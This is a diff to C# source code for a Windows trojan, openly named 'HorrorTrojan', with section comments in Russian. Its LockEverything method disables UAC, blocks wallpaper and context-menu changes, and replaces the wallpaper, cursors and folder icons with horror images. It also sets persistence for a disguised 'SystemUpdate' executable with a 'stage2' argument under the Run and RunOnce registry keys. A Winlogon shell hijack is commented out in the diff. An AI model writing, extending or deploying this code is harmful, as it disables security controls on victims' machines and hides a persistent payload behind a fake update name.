@@ -6,6 +6,7 @@ namespace HorrorTrojan
     {
         public static void LockEverything()
         {
+            // ===== ОТКЛЮЧЕНИЕ UAC =====
             using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
             {
                 key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
@@ -13,12 +14,14 @@ namespace HorrorTrojan
                 key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
             }
             
+            // ===== ЗАПРЕТ ИЗМЕНЕНИЙ В ПРОВОДНИКЕ =====
             using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
             {
                 key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
                 key.SetValue("NoViewContextMenu", 1, RegistryValueKind.DWord);
             }
             
+            // ===== УСТАНОВКА ОБОЕВ =====
             using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop"))
             {
                 key.SetValue("Wallpaper", @"C:\Windows\ProgramFiles\SystemUpdate\wallpaper.jpg", RegistryValueKind.String);
@@ -26,6 +29,7 @@ namespace HorrorTrojan
                 key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
             }
             
+            // ===== УСТАНОВКА КУРСОРА =====
             using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors"))
             {
                 key.SetValue("SchemeSource", 1, RegistryValueKind.DWord);
@@ -45,31 +49,33 @@ namespace HorrorTrojan
                 key.SetValue("UpArrow", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ani", RegistryValueKind.String);
             }
             
+            // ===== БЛОКИРОВКА ЯРЛЫКОВ =====
             using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@"\.lnk\ShellNew"))
             {
                 key.SetValue("Command", "", RegistryValueKind.String);
             }
             
-            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
-            {
-                key.SetValue("Shell", "explorer.exe," + @"C:\Windows\ProgramFiles\SystemUpdate\update.exe", RegistryValueKind.String);
-            }
+            // ===== SHELL НЕ ТРОГАЕМ (ЧТОБЫ РАБОЧИЙ СТОЛ РАБОТАЛ) =====
+            // ПОДМЕНА Shell УБРАНА!
+            // key.SetValue("Shell", "explorer.exe," + @"C:\Windows\ProgramFiles\SystemUpdate\update.exe", RegistryValueKind.String);
             
+            // ===== АВТОЗАГРУЗКА (через Run) =====
             using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
             {
-                key.SetValue("SystemUpdate", @"C:\Windows\ProgramFiles\SystemUpdate\update.exe", RegistryValueKind.String);
+                key.SetValue("SystemUpdate", @"C:\Windows\ProgramFiles\SystemUpdate\update.exe stage2", RegistryValueKind.String);
             }
             
             using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
             {
-                key.SetValue("SystemUpdate", @"C:\Windows\ProgramFiles\SystemUpdate\update.exe", RegistryValueKind.String);
+                key.SetValue("SystemUpdate", @"C:\Windows\ProgramFiles\SystemUpdate\update.exe stage2", RegistryValueKind.String);
             }
             
             using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
             {
-                key.SetValue("SystemUpdate", @"C:\Windows\ProgramFiles\SystemUpdate\update.exe", RegistryValueKind.String);
+                key.SetValue("SystemUpdate", @"C:\Windows\ProgramFiles\SystemUpdate\update.exe stage2", RegistryValueKind.String);
             }
             
+            // ===== СМЕНА ИКОНОК =====
             using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@"Folder\DefaultIcon"))
                 key.SetValue("", @"C:\Windows\ProgramFiles\SystemUpdate\eye.ico,0", RegistryValueKind.String);
                 
